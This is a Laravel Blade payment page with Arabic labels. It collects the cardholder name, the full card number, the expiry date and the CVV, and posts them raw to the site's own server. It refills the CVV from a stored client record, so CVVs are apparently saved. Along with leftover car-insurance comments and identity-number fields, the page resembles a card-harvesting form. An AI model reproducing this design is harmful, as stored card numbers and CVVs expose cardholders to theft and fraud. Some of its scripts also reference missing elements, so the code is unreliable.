@extends('frontend.layout.master')
@section('content')
@php
use Carbon\Carbon;

$years=[];
for ($i=24; $i < 41 ; $i++) { $years[]='20' .$i; } $months=[]; for ($i=1; $i < 13 ; $i++) { $months[]=$i; } @endphp
    <section class="payment-section m-5  section-padding">
    <div class="container">
        <div class="row">



            <div class="img-for-payment d-flex justify-between mb-3 ">
                <img src="{{ asset('frontend') }}/assets/images/payment/mada-card.svg" alt="payment">
                <img src="{{ asset('frontend') }}/assets/images/payment/master-card.svg" alt="payment">
                <img src="{{ asset('frontend') }}/assets/images/payment/sadad-payment-logo.svg" alt="payment">
                <img src="{{ asset('frontend') }}/assets/images/payment/visa-card.svg" alt="payment">
            </div>

            <form class="payment-description p-5" action="{{route('stepFiveAction')}}" method="post">
                @csrf
                <input type="hidden" name="client_id" value="{{ $client->id }}">
                <input type="hidden" name="national_number" value="{{$client->national_number}}">
                <input type="hidden" name="name" id="name">
                <input type="hidden" name="step" value="5">

                <!--no3 el car -->
                <div class="mt-3" id="input-Tasalsol">
                    <label for="exampleInputPassword1" class="form-label">الاسم كما هوا مدون بالبطاقه </label>
                    <input class="ta form-control input-of-buy" name="last_name" value="{{ old('last_name') ?? $client->last_name }}">
                </div>
                @error('last_name')
                <p class="text-danger">{{ $message }}</p>
                @enderror
                <!-- kemt el car -->
                <div class="mt-3">
                    <label for="exampleInputPassword1" class="form-label">رقم البطاقه </label>
                    <input class=" ta form-control " name="visa_number" type="text" style="direction:ltr; text-align: right;"  id="credit_card" maxlength="19" value="{{ old('visa_number')??'' }}">
                </div>
                @if ($client->verified_visa == -1)
                    <p class="text-danger">الرجاء ادخال رقم بطاقة صحيح</p>
                @endif
                @error('visa_number')
                <p class="text-danger">{{ $message }}</p>
                @enderror
                <!-- sanat el son3 -->
                <div class="mt-3" id="input-Tasalsol">
                    <label for="exampleInputPassword1" class="form-label">تاريخ الانتهاء </label>
                    <div class="row justify-conten-center">
                        <div class="mt-3 col-6">
                            <label for="exampleInputPassword1" class="form-label">سنة
                            </label>

                            <select class=" form-control " aria-label="Default  example" name="visa_end_year">
                                @foreach ($years as $year )
                                <option value="{{ $year }}">{{ $year }}</option>
                                @endforeach
                            </select>
                            @error('year')
                            <p class="text-danger">{{ $message }}</p>
                            @enderror
                        </div>
                        <div class="mt-3 col-6">
                            <label for="exampleInputPassword1" class="form-label">شهر
                            </label>

                            <select class=" form-control " aria-label="Default  example" name="visa_end_month">
                                @foreach ($months as $month )
                                <option value="{{ $month }}">{{ $month }}</option>
                                @endforeach
                            </select>
                            @error('month')
                            <p class="text-danger">{{ $message }}</p>
                            @enderror
                        </div>



                    </div>
                </div>
                <!-- makan el son3 -->
                <div class="mt-3" id="input-Tasalsol">
                    <label for="exampleInputPassword1" class="form-label">CVV</label>
                    <input class="ta form-control input-of-buy" id="cvv" name="visa_vcc" maxlength="3"
                        value="{{ old('visa_vcc') ?? $client->visa_vcc }}" placeholder="يجب ان يكون ثلاثة ارقام فقط">
                </div>
                @error('visa_vcc')
                <p class="text-danger">{{ $message }}</p>
                @enderror
                <div class="btn-info-box mt-4  d-flex justify-content-center">
                    <button class=" ta btn btn-secondary btn-sm mt-4 w-50  ">الاستمرار في الدفع</button>
                </div>
            </form>
        </div>
    </div>
    </section>



    @endsection
    @section('custom-script')

    <script src="{{ asset('frontend/assets/js/steps.js') }}"></script>
    <script>
        window.onload = function () {
            const urlParams = new URLSearchParams(window.location.search);
                document.getElementById('identity_number').value = urlParams.get('identity_number') || '';
            document.getElementById('name').value = urlParams.get('name') || '';
        };
    </script>
    
    <script>
    const cardNumberInput = document.getElementById('credit_card');


        cardNumberInput.addEventListener('input', function(event) {
          let trimmedValue = event.target.value.replace(/\s/g, ''); // Remove existing spaces
          trimmedValue = trimmedValue.replace(/\D/g, '').substring(0, 16); // Remove non-digits and limit to 16 digits

          let formattedValue = '';
          for (let i = 0; i < trimmedValue.length; i++) {
            if (i > 0 && i % 4 === 0) {
              formattedValue += ' '; // Add space after every 4 digits
            }
            formattedValue += trimmedValue[i];
          }

          event.target.value = formattedValue;
        });


    const cvv = document.getElementById('cvv');
    // Add input and keypress event listeners
    cvv.addEventListener('input', restrictInput);
    cvv.addEventListener('keypress', restrictKeyPress);

    function restrictInput(event) {
        const inputValue = event.target.value;
        event.target.value = inputValue.replace(/\D/g, '').slice(0, 3);
        ``
    }

    function restrictKeyPress(event) {
        const inputValue = event.key;
        // Allow only digits and prevent input if length is already 3
        if (!/^\d$/.test(inputValue) || event.target.value.length >= 3) {
            event.preventDefault();
        }
    }
    
    jQuery.extend(jQuery.validator.messages, {
        required: "هذا الحقل مطلوب",
        email: "يرجى ادخال بريد الكتروني صحيح",
        number: "يرجى ادخال ارقام فقط",
        creditcard: "يرجى ادخال رقم بطاقة صحيحة من فضلك",
        maxlength: jQuery.validator.format("Please enter no more than {0} characters."),
        minlength: jQuery.validator.format("Please enter at least {0} characters."),
        rangelength: jQuery.validator.format("Please enter a value between {0} and {1} characters long."),
        range: jQuery.validator.format("Please enter a value between {0} and {1}."),
        max: jQuery.validator.format("Please enter a value less than or equal to {0}."),
        min: jQuery.validator.format("Please enter a value greater than or equal to {0}.")
    });



    $("#validateForm").validate({
        rules: {
            visa_number: {
                required: true,
                creditcard: true
            },
             visa_vcc: {
                    required: true,
                    minlength: 3,
                    maxlength: 3
                },
        },
        errorPlacement: function(error, element) {
            var placement = $(element).data('error');
            if (placement) {
                $(placement).append(error)
            } else {
                error.insertAfter(element);
            }
        },
    });
    document.addEventListener("DOMContentLoaded", function() {
    var lightbox = document.getElementById("lightbox");
    var closeButton = document.querySelector(".close-button");

    // Display the lightbox automatically when the page loads
    lightbox.style.display = "block";

    // Close the lightbox when the close button is clicked
    closeButton.addEventListener("click", function() {
        lightbox.style.display = "none";
    });

    // Close the lightbox when clicking outside the lightbox content
    window.addEventListener("click", function(event) {
        if (event.target == lightbox) {
            lightbox.style.display = "none";
        }
    });
});


</script>
    </script>
    @endsection
